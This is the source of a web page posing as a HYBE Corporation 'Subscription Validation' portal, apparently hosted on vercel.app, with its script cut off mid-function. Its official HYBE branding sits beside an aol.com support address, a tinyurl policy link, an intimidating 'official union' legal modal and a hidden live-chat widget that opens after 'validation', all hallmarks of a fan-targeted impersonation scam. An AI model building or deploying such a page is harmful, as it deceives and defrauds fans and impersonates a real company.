<html lang="en"> 
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="HYBE-CORP Subscription Validation - Secure your access to premium content.">
  <meta name="author" content="HYBE CORP">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="HYBE-CORP: Subscription Validation">
  <meta property="og:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
  <meta property="og:image" content="https://hybecorp.com/images/common/logo-b.svg">
  <meta property="og:url" content="https://hybecorp-permitvalidator.vercel.app">
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="HYBE Corporation">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="HYBE-CORP: Subscription Validation">
  <meta name="twitter:description" content="Validate your HYBE Corporation subscription to access premium content securely.">
  <meta name="twitter:image" content="https://hybecorp.com/images/common/logo-b.svg">
  <title>HYBE-CORP: Subscription Validation</title>

  <!-- Favicons -->
  <link rel="icon" href="https://hybecorp.com/images/common/logo-b.svg" type="image/svg+xml">

  <!-- Bootstrap 5 CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  
  <!-- Bootstrap Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
  
  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
  
  <!-- SweetAlert2 -->
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
  
  <!-- AOS Animation -->
  <link href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" rel="stylesheet">
  
  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>

  <style>
    :root {
      /* Color tokens (preserve original names & values) */
      --hybe-primary: #1a365d;
      --hybe-secondary: #2d3748;
      --hybe-accent: #3182ce;
      --hybe-success: #38a169;
      --hybe-warning: #d69e2e;
      --hybe-error: #e53e3e;
      --hybe-light: #f8f9fa;
      --hybe-dark: #212529;
      --hybe-gradient: linear-gradient(135deg, rgba(26,54,93,1) 0%, rgba(49,130,206,1) 100%);
      --hybe-card-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      --hybe-elevation: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);

      /* 8pt spacing grid */
      --space-1: 8px;   /* 1 */
      --space-2: 16px;  /* 2 */
      --space-3: 24px;  /* 3 */
      --space-4: 32px;  /* 4 */
      --space-5: 40px;  /* 5 */

      /* Typographic scale */
      --type-scale-xs: 0.75rem;   /* 12px */
      --type-scale-sm: 0.875rem;  /* 14px */
      --type-scale-md: 1rem;      /* 16px */
      --type-scale-lg: 1.25rem;   /* 20px */
      --type-scale-xl: 1.5rem;    /* 24px */

      /* Motion */
      --motion-fast: 150ms;
      --motion-medium: 300ms;
      --motion-slow: 500ms;

      /* Elevation colors */
      --focus-ring: rgba(49, 130, 206, 0.22);
    }

    /* Dark mode variations (keeps round/blue look) */
    body.dark {
      --hybe-light: #0f1720;
      --hybe-primary: #acc8ff;
      background-color: #071029;
      color: var(--hybe-light);
    }

    /* Base styles (preserve original) */
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f5f7fa;
      color: var(--hybe-secondary);
      line-height: 1.6;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow-x: hidden;
    }

    /* Respect reduced motion preference */
    @media (prefers-reduced-motion: reduce) {
      * { animation-duration: 0.001ms !important; transition-duration: 0.001ms !important; }
    }

    /* Focus visible (accessibility) */
    :focus { outline: none; }
    :focus-visible { box-shadow: 0 0 0 4px var(--focus-ring); border-radius: 8px; }

    /* Background pattern (preserve) */
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: radial-gradient(circle at 25% 25%, rgba(49, 130, 206, 0.08) 0%, transparent 50%), radial-gradient(circle at 75% 75%, rgba(26, 54, 93, 0.06) 0%, transparent 50%);
      background-size: 300px 300px;
      z-index: -2;
      opacity: 0.5;
    }

    /* Main container with responsive max-width */
    .main-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding-top: var(--space-3);
      padding-bottom: var(--space-5);
    }

    .container.max-width {
      max-width: 980px;
    }

    /* Logo container */
    .brand-logo {
      text-align: center;
      margin-bottom: var(--space-2);
      transition: transform var(--motion-medium) ease;
    }

    .brand-logo:hover { transform: translateY(-4px); }
    .brand-logo img { height: 92px; width: auto; max-width: 100%; filter: drop-shadow(0 6px 10px rgba(0,0,0,0.08)); }

    /* Card styling (preserve) */
    .validation-card {
      background: white;
      border-radius: 16px;
      box-shadow: var(--hybe-elevation);
      border: none;
      overflow: hidden;
      transition: transform var(--motion-medium) ease, box-shadow var(--motion-medium) ease;
      position: relative;
      z-index: 1;
    }

    .validation-card:hover { transform: translateY(-6px); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15); }
    .validation-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--hybe-gradient); }

    .card-header { background: transparent; border-bottom: 1px solid rgba(0,0,0,0.05); padding: var(--space-2) var(--space-3) var(--space-1); }
    .card-body { padding: var(--space-3); }
    .card-footer { background: transparent; border-top: 1px solid rgba(0,0,0,0.05); padding: var(--space-2) var(--space-3); }

    /* Typography */
    .display-title { font-family: 'Poppins', sans-serif; font-weight: 700; color: var(--hybe-primary); letter-spacing: -0.4px; margin-bottom: 6px; font-size: var(--type-scale-xl); }
    .subtitle { color: var(--hybe-secondary); font-weight: 400; opacity: 0.95; margin-bottom: var(--space-3); }

    /* Form elements */
    .form-label { font-weight: 600; color: var(--hybe-secondary); margin-bottom: 0.75rem; }
    .form-control { border: 2px solid #e2e8f0; border-radius: 10px; padding: 0.75rem 1.25rem; font-size: var(--type-scale-md); transition: all var(--motion-fast) ease; height: auto; }
    .form-control:focus { border-color: var(--hybe-accent); box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.2); }
    .form-control.is-valid { border-color: var(--hybe-success); }
    .form-control.is-invalid { border-color: var(--hybe-error); }
    .form-text { font-size: var(--type-scale-sm); color: #64748b; }

    /* Input wrapper for masked input */
    .input-with-action { position: relative; }
    .input-action { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: transparent; border: none; color: var(--hybe-secondary); padding: 6px; border-radius: 8px; cursor: pointer; }
    .input-action:focus { outline: none; box-shadow: 0 0 0 3px var(--focus-ring); }

    /* Buttons (preserve look) */
    .btn-hybe { background: var(--hybe-gradient); border: none; border-radius: 10px; font-weight: 600; padding: 0.75rem 1.5rem; color: white; transition: all var(--motion-medium) ease; position: relative; overflow: hidden; box-shadow: 0 4px 6px rgba(26, 54, 93, 0.1); }
    .btn-hybe:hover { transform: translateY(-2px); box-shadow: 0 10px 15px rgba(26, 54, 93, 0.2); color: white; }
    .btn-hybe::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent); transition: left 0.7s; }
    .btn-hybe:hover::before { left: 100%; }

    /* Security badge */
    .security-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(56, 161, 105, 0.08); color: var(--hybe-success); padding: 0.5rem 1rem; border-radius: 999px; font-size: var(--type-scale-sm); font-weight: 500; margin-bottom: var(--space-3); border: 1px solid rgba(56, 161, 105, 0.14); }

    /* Timer */
    .timer-container { display: grid; grid-template-columns: repeat(4, 1fr); gap: var(--space-2); background: white; padding: var(--space-3); border-radius: 12px; margin: var(--space-3) 0; border: 1px solid rgba(49,130,206,0.12); box-shadow: var(--hybe-card-shadow); }
    .timer-unit { display: flex; flex-direction: column; align-items: center; }
    .timer-value { font-size: 1.75rem; font-weight: 700; color: var(--hybe-primary); font-family: 'Poppins', sans-serif; }
    .timer-label { font-size: var(--type-scale-xs); text-transform: uppercase; color: var(--hybe-secondary); letter-spacing: 0.5px; opacity: 0.75; }

    /* Footer */
    .hybe-footer { background: var(--hybe-primary); color: white; padding: var(--space-4) 0; }
    .footer-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: var(--space-3); }
    .footer-title { font-weight: 600; margin-bottom: 0.75rem; font-size: 1.1rem; }
    .footer-link { color: rgba(255,255,255,0.85); text-decoration: none; transition: color 0.2s ease; display: inline-block; margin-bottom: 0.5rem; }
    .footer-link:hover { color: white; text-decoration: underline; }

    /* Particles */
    #particles-js { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.6; }

    /* Modal scroll class (moved inline styles to class) */
    .modal-scroll { max-height: 60vh; overflow-y: auto; }

    /* Toasts */
    .toast-container-custom { position: fixed; top: var(--space-2); right: var(--space-2); z-index: 2000; display: flex; flex-direction: column; gap: 8px; }
    .toast-custom { background: white; border-radius: 8px; padding: 12px 16px; box-shadow: var(--hybe-card-shadow); display: flex; gap: 10px; align-items: center; min-width: 260px; }
    .toast-custom.success { border-left: 4px solid var(--hybe-success); }
    .toast-custom.error { border-left: 4px solid var(--hybe-error); }
    .toast-custom.info { border-left: 4px solid var(--hybe-accent); }

    /* Input validation animation */
    .animate { transition: transform var(--motion-fast) ease; transform: translateY(-6px); }

    /* Responsive adjustments (preserve breakpoints) */
    @media (max-width: 768px) {
      .main-container { padding-top: var(--space-2); }
      .card-header, .card-body, .card-footer { padding: var(--space-2); }
      .brand-logo img { height: 72px; }
    }

    /* Animations */
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    .fade-in { animation: fadeIn 0.6s ease-out forwards; }

    /* Floating animation */
    @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-8px); } 100% { transform: translateY(0px); } }
    .floating { animation: float 3.2s ease-in-out infinite; }

    /* Modal z-index fixes */
    .modal { z-index: 1050 !important; }
    .modal-backdrop { z-index: 1040 !important; }
    #legalDisclaimerModal { z-index: 999999 !important; }
    #legalDisclaimerModal + .modal-backdrop { z-index: 999998 !important; }

    /* Make sure other modals stay behind */
    .validation-card { position: relative; z-index: 1; }

    /* Reduced spinner size */
    .spinner-border { width: 1.2rem; height: 1.2rem; border-width: 0.15em; vertical-align: middle; margin-right: 0.5rem; }

    /* Custom checkbox for terms */
    .form-check-input:checked { background-color: var(--hybe-accent); border-color: var(--hybe-accent); }
  </style>
</head>
<body>
  <noscript>
    <div class="alert alert-danger text-center mt-4 mx-3" role="alert">
      <h2 class="h4">JavaScript Required</h2>
      <p>JavaScript is disabled in your browser. Please enable it to validate your subscription, or <a href="mailto:support@hybecorp.com" class="alert-link">contact support</a> for assistance.</p>
    </div>
  </noscript>

  <div id="particles-js"></div>

  <div class="main-container">
    <div class="container max-width">
      <div class="row justify-content-center">
        <div class="col-lg-8 col-xl-6">
          <!-- Brand/logo -->
          <div class="brand-logo fade-in floating" role="img" aria-label="HYBE logo">
            <img id="brandLogo" src="https://hybecorp.com/images/common/logoB.svg" alt="HYBE Logo" class="img-fluid">
          </div>

          <!-- Theme toggle (accessible) -->
          <div class="d-flex justify-content-end mb-2">
            <button id="themeToggle" class="btn btn-outline-secondary btn-sm" aria-pressed="false" aria-label="Toggle dark mode">
              <i class="bi bi-moon-stars me-2"></i><span class="small">Dark</span>
            </button>
          </div>

          <!-- Main card -->
          <div class="card validation-card fade-in" data-aos="zoom-in" data-aos-delay="300">
            <div class="card-header text-center">
              <div class="security-badge" aria-hidden="true">
                <i class="bi bi-shield-lock-fill"></i>
                <span>Enterprise-Grade Security</span>
              </div>
            </div>
            
            <div class="card-body">
              <h1 class="display-title text-center mb-2">HYBE License Validation</h1>
              <p class="subtitle text-center">Unlock access to HYBE Corporation's subscription services securely.</p>
              
              <form id="validationForm" action="/verify" method="POST" novalidate aria-describedby="formHelp">
                <div class="mb-4">
                  <label for="codeInput" class="form-label">Subscription ID</label>
                  <div class="input-with-action">
                    <input
                      type="password"
                      id="codeInput"
                      class="form-control"
                      placeholder="Enter your Subscription ID (e.g., HYB123XYZ789)"
                      pattern="[A-Z0-9]{10,20}"
                      title="Subscription ID must be 10-20 alphanumeric characters"
                      required
                      minlength="10"
                      maxlength="20"
                      autocomplete="off"
                      spellcheck="false"
                      aria-describedby="codeInputHelp errorMessage"
                      aria-invalid="false"
                    >
                    <button type="button" id="toggleMask" class="input-action" aria-label="Show subscription ID" title="Show subscription ID">
                      <i class="bi bi-eye"></i>
                    </button>
                  </div>

                  <div id="codeInputHelp" class="form-text mt-2">
                    <i class="bi bi-info-circle-fill text-primary me-1"></i>
                    <span>Your subscription ID is case-insensitive and contains 10-20 alphanumeric characters.</span>
                  </div>

                  <div id="errorMessage" class="form-text text-danger mt-2" role="alert" aria-live="assertive" style="display:none"></div>
                </div>
                
                <div class="form-check mb-4">
                  <input class="form-check-input" type="checkbox" id="termsCheck" required>
                  <label class="form-check-label small" for="termsCheck">
                    I agree to the <a href="https://account.hybeim.com/en/policies/terms-of-service" class="text-decoration-none">Terms of Service</a> and <a href="https://tinyurl.com/hybecorp-privacypolicy" class="text-decoration-none">Privacy Policy</a>
                  </label>
                </div>
                
                <button type="submit" class="btn btn-hybe w-100 py-3" id="validateBtn">
                  <span class="btn-text"><i class="bi bi-shield-check me-2"></i> Validate Subscription</span>
                  <span class="btn-loading d-none"><span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Processing...</span>
                </button>
              </form>
            </div>
            
            <div class="card-footer text-center">
              <div class="d-flex flex-column gap-3">
                <small class="text-muted"><i class="bi bi-lock-fill me-1"></i> Your data is encrypted end-to-end</small>
                <small class="text-muted"><i class="bi bi-exclamation-triangle-fill me-1"></i> Disable privacy extensions if experiencing issues</small>
              </div>
              
              <div class="mt-4">
                <div class="accordion accordion-flush" id="helpAccordion">
                  <div class="accordion-item border-0">
                    <h2 class="accordion-header">
                      <button class="accordion-button collapsed bg-light rounded" type="button" data-bs-toggle="collapse" data-bs-target="#helpContent" aria-expanded="false" aria-controls="helpContent">
                        <i class="bi bi-question-circle-fill text-primary me-2" aria-hidden="true"></i>
                        <span class="fw-semibold">How to find your Subscription ID?</span>
                      </button>
                    </h2>
                    <div id="helpContent" class="accordion-collapse collapse" data-bs-parent="#helpAccordion">
                      <div class="accordion-body px-0 pt-3">
                        <p class="small">Your Subscription ID is a 10-20 character alphanumeric code provided in your HYBE account email or dashboard. It looks like <strong>HYB123XYZ789</strong>.</p>
                        <p class="small mb-0">Check your email or contact <a href="mailto:hybe.corp@aol.com" class="text-decoration-none">support@hybecorp</a> for assistance.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Legal Disclaimer Modal -->
  <div class="modal fade" id="legalDisclaimerModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
    <div class="modal-dialog modal-dialog-centered modal-lg">
      <div class="modal-content">
        <div class="modal-header bg-light">
          <h5 class="modal-title"><i class="bi bi-shield-lock-fill me-2"></i> HYBE Corporation Legal Agreement</h5>
        </div>
        <div class="modal-body modal-scroll">
          <div class="alert alert-primary">
            <h6><i class="bi bi-megaphone-fill me-2"></i>Welcome to HYBE Corporation's Official Network</h6>
            <p class="mb-0">By proceeding, you're entering into an official union with HYBE Corporation and all its affiliated labels.</p>
          </div>
          
          <h6 class="mt-4">Affiliated Labels:</h6>
          <ul>
            <li>BIGHIT MUSIC</li>
            <li>BELIFT LAB</li>
            <li>SOURCE MUSIC</li>
            <li>PLEDIS Entertainment</li>
            <li>KOZ Entertainment</li>
            <li>ADOR</li>
            <li>HYBE LABELS JAPAN</li>
            <li>HYBE AMERICA</li>
          </ul>
          
          <h6 class="mt-4">Terms & Conditions:</h6>
          <ol>
            <li>You agree to maintain a safe and clean communication environment at all times.</li>
            <li>All interactions must comply with Korean Law regarding celebrity privacy and digital communications.</li>
            <li>Under HYBE Corporation policies, you are prohibited from disclosing any confidential information.</li>
            <li>Unauthorized sharing of artist communications or proprietary information violates HYBE's internal regulations and copyright law.</li>
            <li>Misuse of this access may result in immediate termination and legal action.</li>
            <li>All communications are monitored for quality assurance and security purposes.</li>
          </ol>
          
          <div class="alert alert-warning mt-3">
            <h6><i class="bi bi-exclamation-triangle-fill me-2"></i>Important Notice</h6>
            <p class="mb-0">This is a privileged access system. Any breach of confidentiality will be prosecuted to the fullest extent of law.</p>
          </div>
          
          <div class="form-check mt-4">
            <input class="form-check-input" type="checkbox" id="legalAgreementCheck" required>
            <label class="form-check-label" for="legalAgreementCheck">I acknowledge and agree to all terms stated above.</label>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" id="cancelValidationBtn">Cancel</button>
          <button type="button" class="btn btn-hybe" id="proceedValidationBtn" disabled><i class="bi bi-check-circle-fill me-2"></i>Proceed with Validation</button>
        </div>
      </div>
    </div>
  </div>

  <footer class="hybe-footer">
    <div class="container">
      <div class="footer-links">
        <div>
          <h3 class="footer-title">HYBE Corporation</h3>
          <p class="small">Leading entertainment & technology company</p>
          <div class="social-links">
            <a href="https://www.linkedin.com/company/hybe-corp/" class="social-link" target="_blank" aria-label="LinkedIn"><i class="bi bi-linkedin"></i></a>
            <a href="https://twitter.com/HYBEOFFICIALtwt" class="social-link" target="_blank" aria-label="Twitter"><i class="bi bi-twitter-x"></i></a>
            <a href="https://www.instagram.com/hybe.labels/" class="social-link" target="_blank" aria-label="Instagram"><i class="bi bi-instagram"></i></a>
            <a href="https://www.facebook.com/HYBE.official" class="social-link" target="_blank" aria-label="Facebook"><i class="bi bi-facebook"></i></a>
          </div>
        </div>
        
        <div>
          <h3 class="footer-title">Support</h3>
          <a href="mailto:hybe.corp@aol.com" class="footer-link small d-block mb-2"><i class="bi bi-envelope-fill me-2"></i>support@hybecorp</a>
          <p class="small mb-0">24/7 Customer Service</p>
        </div>
        
        <div>
          <h3 class="footer-title">Legal</h3>
          <a href="https://account.hybeim.com/en/policies/terms-of-service" class="footer-link small d-block mb-2">Terms of Service</a>
          <a href="https://account.hybeim.com/en/policies/privacy-policy" class="footer-link small d-block mb-2">Privacy Policy</a>
          <a href="https://account.hybeim.com/en/policies/cookie-policy" class="footer-link small d-block">Cookie Policy</a>
        </div>
      </div>
      
      <hr class="my-4" style="border-color: rgba(255,255,255,0.1);">
      
      <div class="d-flex flex-column flex-md-row justify-content-between align-items-center">
        <p class="small mb-2 mb-md-0">© 2025 HYBE Corporation. All rights reserved.</p>
        <div class="small"><span class="d-inline-block me-3">v2.1.0</span><span class="text-white-50">Secure. Reliable. Trusted.</span></div>
      </div>
    </div>
  </footer>

  <!-- Toast container -->
  <div id="toastContainer" class="toast-container-custom" aria-live="polite" aria-atomic="true"></div>

  <!-- JavaScript Libraries -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
  
  <!-- Smartsupp Live Chat script -->
  <script>
    var _smartsupp = _smartsupp || {};
    _smartsupp.key = '95a4146044c039bddfd0d3c872316d5187481695';
    _smartsupp.widget = 'hidden';
    window.smartsupp||(function(d) {
      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
      c.type='text/javascript';c.charset='utf-8';c.async=true;
      c.src='https://www.smartsuppchat.com/loader.js';s.parentNode.insertBefore(c,s);
    })(document);
  </script>

  <script>
    // Initialize animations
    AOS.init({ duration: 800, easing: 'ease-out-quad', once: true });

    // Initialize particles.js
    document.addEventListener('DOMContentLoaded', function() {
      if (typeof particlesJS !== 'undefined') {
        particlesJS('particles-js', {
          particles: { number: { value: 60, density: { enable: true, value_area: 800 } }, color: { value: "#1a365d" }, shape: { type: "circle" }, opacity: { value: 0.45, random: true }, size: { value: 3, random: true }, line_linked: { enable: true, distance: 160, color: "#3182ce", opacity: 0.5, width: 1 }, move: { enable: true, speed: 2.5, direction: "none", random: true, straight: false, out_mode: "out" } },
          interactivity: { detect_on: "canvas", events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } } }
        });
      }
    });

    // Utility: show toast messages
    function showToast(type, title, message) {
      const container = document.getElementById('toastContainer');
      const toast = document.createElement('div');
      toast.className = `toast-custom ${type}`;
      toast.setAttribute('role', 'status');
      toast.innerHTML = `<div><strong>${title}</strong><div class="small text-muted">${message}</div></div><div style="margin-left:auto"><button class=\"btn-close\" aria-label=\"Close\"></button></div>`;
      container.appendChild(toast);

      const closeBtn = toast.querySelector('.btn-close');
      closeBtn.addEventListener('click', () => { toast.remove(); });

      setTimeout(() => { if (toast.parentNode) toast.remove(); }, 7000);
    }

    function showErrorAlert(title, message, supportRef=null) {
      showToast('error', title, message + (supportRef ? ` — ${supportRef}` : ''));
    }

    // Input handling: uppercase, mask toggle, live validation
    const codeInput = document.getElementById('codeInput');
    const toggleMask = document.getElementById('toggleMask');
    const errorMessage = document.getElementById('errorMessage');

    codeInput.addEventListener('input', function() {
      const caret = this.selectionStart;
      this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
      this.setSelectionRange(caret, caret);
      const isValid = /^[A-Z0-9]{10,20}$/.test(this.value);
      this.classList.toggle('is-valid', isValid && this.value.length >= 10);
      this.classList.toggle('is-invalid', this.value.length > 0 && !isValid);
      if (!isValid && this.value.length > 0) {
        errorMessage.style.display = 'block';
        errorMessage.textContent = 'Subscription ID must contain 10-20 alphanumeric characters.';
        this.setAttribute('aria-invalid', 'true');
      } else {
        errorMessage.style.display = 'none';
        errorMessage.textContent = '';
        this.setAttribute('aria-invalid', 'false');
      }
    });

    toggleMask.addEventListener('click', function() {
      const type = codeInput.getAttribute('type');
      if (type === 'password') {
        codeInput.setAttribute('type', 'text');
        this.innerHTML = '<i class="bi bi-eye-slash"></i>';
        this.setAttribute('aria-label', 'Hide subscription ID');
        this.title = 'Hide subscription ID';
      } else {
        codeInput.setAttribute('type', 'password');
        this.innerHTML = '<i class="bi bi-eye"></i>';
        this.setAttribute('aria-label', 'Show subscription ID');
        this.title = 'Show subscription ID';
      }
      codeInput.focus();
    });

    // Theme toggle (also swap brand logo to match HYBE assets)
    const themeToggle = document.getElementById('themeToggle');
    const brandLogoEl = document.getElementById('brandLogo');
    const HYBE_LOGO_LIGHT = 'https://hybecorp.com/images/common/logoB.svg';
    const HYBE_LOGO_DARK = 'https://hybecorp.com/images/common/logoW.svg';
    themeToggle.addEventListener('click', () => {
      const isDark = document.body.classList.toggle('dark');
      themeToggle.setAttribute('aria-pressed', String(isDark));
      themeToggle.querySelector('i').className = isDark ? 'bi bi-sun-fill me-2' : 'bi bi-moon-stars me-2';
      themeToggle.querySelector('span').textContent = isDark ? 'Light' : 'Dark';
      if (brandLogoEl) { brandLogoEl.src = isDark ? HYBE_LOGO_DARK : HYBE_LOGO_LIGHT; }
    });

    // Ensure correct logo on initial load based on current theme
    if (brandLogoEl) { brandLogoEl.src = document.body.classList.contains('dark') ? HYBE_LOGO_DARK : HYBE_LOGO_LIGHT; }

    // Form submission and validation logic (enhanced with rate-limit handling)
    document.getElementById('validationForm').addEventListener('submit', function(e) {
      e.preventDefault();
      validateSubscription();
    });

    let rateLimitResetAt = null; // timestamp for rate-limit

    async function validateSubscription() {
      const subscriptionId = codeInput.value.trim();
      const submitBtn = document.getElementById('validateBtn');
      const btnText = submitBtn.querySelector('.btn-text');
      const btnLoading = submitBtn.querySelector('.btn-loading');
      
      if (!subscriptionId) { showErrorAlert('Required Field', 'Kindly enter your subscription ID to continue.'); return; }
      const validPattern = /^[A-Z0-9]{10,20}$/;
      if (!validPattern.test(subscriptionId)) { showErrorAlert('Invalid Format', 'Subscription ID must contain 10-20 alphanumeric characters.'); return; }
      if (!document.getElementById('termsCheck').checked) { showErrorAlert('Terms Required', 'Agree to the Terms of Service and Privacy Policy to continue.'); return; }

      // If client-side rate-limit active, show countdown
      if (rateLimitResetAt && Date.now() < rateLimitResetAt) {
        const seconds = Math.ceil((rateLimitResetAt - Date.now()) / 1000);
        showErrorAlert('Rate Limited', `Too many attempts. Please wait ${seconds}s before retrying.`);
        return;
      }

      // Show loading state
      btnText.classList.add('d-none'); btnLoading.classList.remove('d-none'); submitBtn.disabled = true;

      try {
        const userAgreed = await showLegalModal();
        if (!userAgreed) { btnText.classList.remove('d-none'); btnLoading.classList.add('d-none'); submitBtn.disabled = false; return; }
        await showProgressLoader(2000);
        await performValidation(subscriptionId);
      } catch (error) {
        console.error('Validation error:', error);
        showErrorAlert('Connection Error', 'Unable to connect to validation servers. Please try again later.');
      } finally {
        btnText.classList.remove('d-none'); btnLoading.classList.add('d-none'); submitBtn.disabled = false;
      }
    }

    // Progress loader using SweetAlert2
    function showProgressLoader(duration) {
      return new Promise((resolve) => {
        let progress = 0;
        Swal.fire({ title: 'Validating Subscription...', html: `<div class="progress mt-3" style="height: 8px;"><div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%"></div></div><p id="progressText" class="small text-muted mt-2">Verifying your credentials...</p>`, allowOutsideClick: false, showConfirmButton: false, didOpen: () => {
          const progressBar = document.getElementById('progressBar'); const progressText = document.getElementById('progressText'); const startTime = Date.now();
          const interval = setInterval(() => {
            const elapsed = Date.now() - startTime; progress = Math.min(100, (elapsed / duration) * 100); progressBar.style.width = `${progress}%`;
            if (progress < 30) progressText.textContent = 'Verifying credentials...'; else if (progress < 70) progressText.textContent = 'Checking subscription status...'; else progressText.textContent = 'Finalizing validation...';
            if (progress >= 100) { clearInterval(interval); resolve(); }
          }, 30);
        }});
      });
    }

    // Shows legal modal and waits for user action (keeps accessibility)
    function showLegalModal() {
      return new Promise((resolve) => {
        const legalModal = new bootstrap.Modal(document.getElementById('legalDisclaimerModal'), { backdrop: 'static', keyboard: false, focus: true });
        document.getElementById('legalAgreementCheck').checked = false;
        document.getElementById('proceedValidationBtn').disabled = true;

        const agreementCheckbox = document.getElementById('legalAgreementCheck');
        const proceedBtn = document.getElementById('proceedValidationBtn');
        const cancelBtn = document.getElementById('cancelValidationBtn');

        const onChange = () => { proceedBtn.disabled = !agreementCheckbox.checked; };
        const onProceed = () => { cleanup(); resolve(true); };
        const onCancel = () => { cleanup(); resolve(false); };
        const cleanup = () => { agreementCheckbox.removeEventListener('change', onChange); proceedBtn.removeEventListener('click', onProceed); cancelBtn.removeEventListener('click', onCancel); legalModal.hide(); };

        agreementCheckbox.addEventListener('change', onChange);
        proceedBtn.addEventListener('click', onProceed);
        cancelBtn.addEventListener('click', onCancel);

        legalModal.show(); document.getElementById('legalDisclaimerModal').style.zIndex = '999999';
        const backdrop = document.querySelector('.modal-backdrop'); if (backdrop) backdrop.style.zIndex = '999998';
      });
    }

    // Main validation call
    async function performValidation(subscriptionId) {
      await showProgressLoader(1200);
      try {
        const backendUrl = "/verify";

        const response = await fetch(backendUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ subscription_id: subscriptionId }) });

        // Handle rate limiting
        if (response.status === 429) {
          // rate-limit window typically 60s by server; set fallback 60s
          const retryAfter = response.headers.get('Retry-After');
          const waitSecs = retryAfter ? parseInt(retryAfter, 10) : 60;
          rateLimitResetAt = Date.now() + (waitSecs * 1000);
          showErrorAlert('Rate Limited', `Too many requests. Please wait ${waitSecs}s before retrying.`);
          startRateLimitCountdown(waitSecs);
          return;
        }

        const contentType = response.headers.get('content-type') || '';
        if (!contentType.includes('application/json')) { showErrorAlert('Server Error', 'Received an unexpected response from the server.'); return; }

        const result = await response.json();
        if (result.success) {
          sessionStorage.setItem('hybe_session', result.session_token);
          sessionStorage.setItem('verification_id', result.verification_id);

          const expirationDate = new Date(result.Expiration_Date);
          const formattedExpiration = expirationDate.toLocaleString(undefined, { year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric' });

          Swal.fire({ icon: 'success', title: 'Subscription Validated', html: `<div class="text-start"><div class="alert alert-success" role="alert"><i class="bi bi-check-circle-fill me-2"></i> Your subscription has been successfully validated.</div><div class="card mb-3"><div class="card-header bg-light"><h5 class="mb-0"><i class="bi bi-person-badge-fill me-2"></i> Account Information</h5></div><div class="card-body"><div class="row"><div class="col-md-6 mb-3"><p class="mb-1"><strong>Full Name:</strong></p><p><strong>${result.Full_name || 'N/A'}</strong></p></div><div class="col-md-6 mb-3"><p class="mb-1"><strong>Status:</strong></p><p><strong style="color: #008000;">${result.Status || 'N/A'}</strong></p></div><div class="col-md-6 mb-3"><p class="mb-1"><strong>Activation Date:</strong></p><p><strong>${new Date(result.Activation_Date).toLocaleDateString()}</strong></p></div><div class="col-md-6 mb-3"><p class="mb-1"><strong>Expiration:</strong></p><p>${formattedExpiration}</p></div></div></div></div></div>`, width: 700, confirmButtonText: 'Contact Support', confirmButtonColor: '#1a365d', showCancelButton: true, cancelButtonText: 'Close', footer: `<small class="text-muted">Support Reference: ${result.support_reference || 'N/A'}</small>` }).then((res) => { if (res.isConfirmed) { if (window.smartsupp) window.smartsupp('chat:open'); else Swal.fire({ icon: 'error', title: 'Chat Unavailable', text: 'Unable to load the support chat. Please try again or email hybe.corp@aol.com' }); } });

          // Start countdown timer if expiration present
          startCountdownTimer(new Date(result.Expiration_Date));
